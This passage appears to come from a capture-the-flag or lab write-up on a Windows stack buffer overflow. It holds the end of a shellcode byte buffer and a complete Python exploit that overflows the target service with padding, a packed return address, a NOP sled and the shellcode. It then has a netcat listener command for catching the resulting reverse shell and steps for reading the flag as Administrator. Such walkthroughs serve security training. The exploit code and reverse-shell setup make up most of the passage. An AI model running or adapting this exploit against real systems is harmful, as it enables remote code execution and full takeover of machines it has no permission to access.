		buf += b"\x14\xe2\x58\x41\x44\x4c\x33\x22\x34\x2c\xe3\xca\x5e"
		buf += b"\xa3\xdc\xeb\x61\x69\x75\x81\x98\xfa\x70\x5c\xac\x8e"
		buf += b"\xec\x62\xb0\x7f\xb1\xeb\x56\x15\x59\xba\xc1\x82\xc0"
		buf += b"\xe7\x99\x33\x0c\x32\xe4\x74\x86\xb1\x19\x3a\x6f\xbf"
		buf += b"\x09\xab\x9f\x8a\x73\x7a\x9f\x20\x1b\xe0\x32\xaf\xdb"
		buf += b"\x6f\x2f\x78\x8c\x38\x81\x71\x58\xd5\xb8\x2b\x7e\x24"
		buf += b"\x5c\x13\x3a\xf3\x9d\x9a\xc3\x76\x99\xb8\xd3\x4e\x22"
		buf += b"\x85\x87\x1e\x75\x53\x71\xd9\x2f\x15\x2b\xb3\x9c\xff"
		buf += b"\xbb\x42\xef\x3f\xbd\x4a\x3a\xb6\x21\xfa\x93\x8f\x5e"
		buf += b"\x33\x74\x18\x27\x29\xe4\xe7\xf2\xe9\x14\xa2\x5e\x5b"
		buf += b"\xbd\x6b\x0b\xd9\xa0\x8b\xe6\x1e\xdd\x0f\x02\xdf\x1a"
		buf += b"\x0f\x67\xda\x67\x97\x94\x96\xf8\x72\x9a\x05\xf8\x56"
		return buf
def remote_buffer():
	ip = "10.129.43.23"
	port = 21449
	offset = 469
	buffer = b"A"*offset
	shell_code = shell() 
	EIP = pack('<L', 0x621014EC)
	NOPs = b"\x90"*32
	payload = buffer+EIP+NOPs+shell_code
	s = socket.socket()
	s.connect((ip,port))
	s.send(payload)
	s.close()
remote_buffer()
```
Above you see we copy our shell code on a function name `shell()` and we call it in our `remote_buffer()` function and store its output in a variable name `shell_code` and also we import a new library name `struct` and we use it in a variable name `EIP` to pack our return address into  `Little Endian` format because in memory return address store in  `Little Endian` format all other things are we know from our previous exploit code we have above. But Note `payload` variable there we store our complete exploit code input and we have to strictly follow the position `buffer+EIP+NOPs+shell_code`.

---
So that its our exploit code is now ready to fire. Fist open a listener with the following command
```shell
$ nc -lvnp 4444
```
There `4444` is our `LPORT` we use in `msfvanom` to make our shell code. Run The exploit and you got a shell back to you. Now go to `C:\\Users\Administrator\Desktop` and use `type` command in to get the flag our if you switch to `powershell` then you can also use `cat` command to see the flag.
